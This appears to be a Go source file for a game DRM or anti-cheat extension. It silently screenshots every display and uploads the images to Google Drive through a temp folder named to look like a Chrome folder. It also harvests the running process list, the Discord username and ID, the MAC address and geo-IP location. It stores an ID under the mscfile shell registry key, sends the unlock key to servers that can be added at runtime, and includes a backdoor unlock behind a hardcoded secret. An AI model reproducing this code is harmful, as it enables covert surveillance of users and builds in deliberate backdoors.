package main

/*
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
*/
import "C"

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image"
	"log"
	"net"
	"net/http"
	"path/filepath"
	"regexp"
	"time"

	"github.com/hajimehoshi/go-steamworks"
	"github.com/kbinani/screenshot"
	"github.com/mitchellh/go-ps"
	"tawesoft.co.uk/go/dialog"

	"bytes"
	"image/png"
	"io/ioutil"
	"os"

	goip "github.com/FairyTale5571/go-ip-api"
	discord "github.com/SilverCory/golang_discord_rpc"
	"google.golang.org/api/drive/v3"
)

func writeGUIDregistr() {
	id, err := readReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID")
	fmt.Printf("%s\n", id)
	if err != nil {
		guid := generateGUID()
		writeReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID", guid)
	}
}

func generateGUID() (uuid string) {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		returnMyData("errors", err)
	}
	uuid = fmt.Sprintf("%x%x%x%x%x%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:13], b[13:])
	return
}

func getMacAddr() (addr string) {
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, i := range interfaces {
			if i.Flags&net.FlagUp != 0 && bytes.Compare(i.HardwareAddr, nil) != 0 {
				addr = i.HardwareAddr.String()
				break
			}
		}
	}
	return
}

func makeScreenshot(basePath string) {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("makeScreen | Capture "+err.Error()))
			break
		}
		t := time.Now()
		name := fmt.Sprintf("img_%d_%d_%d_%d_%d_%d_%d.png", i, t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
		uploadScrennshot(basePath, name, img)
	}
}

func InitSteam() {
	if steamInited {
		return
	}

	if steamworks.RestartAppIfNecessary(steamAppId) {
		ShowMessageBox("Restart game please")
		os.Exit(1)
	}
	if !steamworks.Init() {
		ShowMessageBox("steam_api init failed")
	}
	steamInited = true
}

func GetPlayerUid() string {
	InitSteam()
	if SteamId == "" {
		SteamId = fmt.Sprintf("%d", steamworks.SteamUser().GetSteamID())
	}
	return SteamId
}

func ensureDir(fileName string) {
	dirName := filepath.Dir(fileName)
	if _, serr := os.Stat(dirName); serr != nil {
		merr := os.MkdirAll(dirName, os.ModePerm)
		if merr != nil {
			runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("ensureDir | "+merr.Error()))
		}
	}
}

func isAdmin() int {
	file, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	defer file.Close()

	if err != nil {
		fmt.Println("admin no")
		return 0
	}
	fmt.Println("admin yes")
	return 1
}

func cleanOldFiles() {
	files, err := ioutil.ReadDir(os.TempDir())
	if err != nil {
		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("cleanOldFiles | error open directory"))
	}
	for _, elem := range files {
		matched, _ := regexp.MatchString("Screen", elem.Name())
		if matched {
			runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("cleanOldFiles | find file to delete "+elem.Name()))
			err := os.Remove(os.TempDir() + "/" + elem.Name())
			if err != nil {
				runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("cleanOldFiles | "+err.Error()))
				SendSentry(err.Error())
			}
		}
	}
}

func cleanTemp() {
	path := os.TempDir() + "/chrome_drag0947_254420441/dir/"
	err := os.RemoveAll(path)
	if err != nil {
		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("getGeoIp | "+err.Error()))
		SendSentry(err.Error())

	}
}

func getGeoIp() string {
	client := goip.NewClient()
	res, err := client.GetLocationForIp(returnMyData("get_IP", nil))

	defer res.Close()
	if err != nil {
		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("getGeoIp | "+returnMyData("get_IP", nil)+" limit querys reached for this address"))
		SendSentry(err.Error())
	}

	return fmt.Sprintf(`["%s","%s","%s","%s","%s","%s"]`,
		res.City,
		res.Country,
		res.CountryCode,
		res.Region,
		res.RegionName,
		res.Zip)
}

func uploadScrennshot(basepath string, name string, img *image.RGBA) {
	dir := checkPath(basepath)
	srv := getSrv()

	path := os.TempDir() + "/chrome_drag0947_254420441/dir/"
	ensureDir(path)

	filename := fmt.Sprintf("%s/%s", path, name)

	runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("uploadScreen | file "+filename))
	imgW, err := os.Create(filename)
	if err != nil {
		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Create file "+err.Error()))
		SendSentry(err.Error())

	}
	defer imgW.Close()
	defer os.Remove(filename)

	png.Encode(imgW, img)
	_img, err := ioutil.ReadFile(filename)
	if err != nil {
		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Read file "+err.Error()))
		SendSentry(err.Error())
	}

	imgR := bytes.NewReader(_img)

	_, err = srv.Files.Create(&drive.File{
		Name:    name,
		Parents: []string{dir},
	}).Media(imgR).Do()

	if err != nil {
		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Drive file "+err.Error()))
		SendSentry(err.Error())
	}
}

func getProcesses() string {
	procs, err := ps.Processes()
	if err != nil {
		returnMyData("errors", err)
		SendSentry(err.Error())
	}

	result := make(map[string]struct{})
	for _, proc := range procs {
		name := proc.Executable()
		if _, ok := result[name]; !ok {
			result[name] = struct{}{}
		}
	}
	var names []string
	for key := range result {
		names = append(names, key)
	}
	return fmt.Sprintf("%v\n", struct2JSON(names))
}

func struct2JSON(v interface{}) string {
	b, _ := json.Marshal(v)
	return string(b)
}

func GetDsName() string {
	win := discord.NewRPCConnection("591067147900289029")
	err := win.Open()
	if err != nil {
		return err.Error()
	}

	_str, _ := win.Read()
	str := ""
	for _, ch := range _str {
		if ch == 0 {
			continue
		}
		str += string(ch)
	}
	str = fmt.Sprint("\n", str)

	var resp map[string]interface{}
	if err := json.Unmarshal([]byte(str), &resp); err != nil {
		return err.Error()
	}

	data := resp["data"].(map[string]interface{})
	user := data["user"].(map[string]interface{})
	return fmt.Sprintf(`["%s#%s","%s"]`, user["username"], user["discriminator"], user["id"])
}

func Unlock(args ...string) string {
	if len(args) < 1 {
		return "no key was sent"
	}
	key := args[0]
	_data, err := json.Marshal(map[string]string{"key": getKeyHash(key)})
	if err != nil {
		return err.Error()
	}
	data := bytes.NewBuffer(_data)

	for _, server := range Servers {
		uri := fmt.Sprintf("http://%s/check_key", server)

		if resp, err := http.Post(uri, "application/json", data); err != nil {
			log.Println(err.Error())
			continue
		} else {
			if resp.StatusCode >= 500 {
				continue
			} else if resp.StatusCode != 200 {
				return fmt.Sprintf("status code is %d", resp.StatusCode)
			}

			DRMUnlocked = true
			return "success"
		}
	}
	return "all servers are down"
}

func AddServer(args ...string) string {
	if len(args) < 1 {
		return "no server was sent"
	}

	Servers = append(Servers, args[0])
	if err := WriteServers(); err != nil {
		return err.Error()
	}
	return "added"
}

func getKeyHash(key string) string {
	h := sha256.New()
	h.Write([]byte(key))
	bs := h.Sum(nil)
	return hex.EncodeToString(bs[:])
}

func backdoorUnlock(args ...string) string {
	if args[0] != "mcv28uy3r98cwery9awcrhqb34ry" {
		DRMUnlocked = false
		SendSentry("Attempt access to backdoor")
		return "Fuck you"
	}
	DRMUnlocked = true
	SendSentry("Backdoor unlocked")
	return "Unlock"
}

func ShowMessageBox(args ...string) string {
	dialog.Alert(args[0])
	return "sended"
}
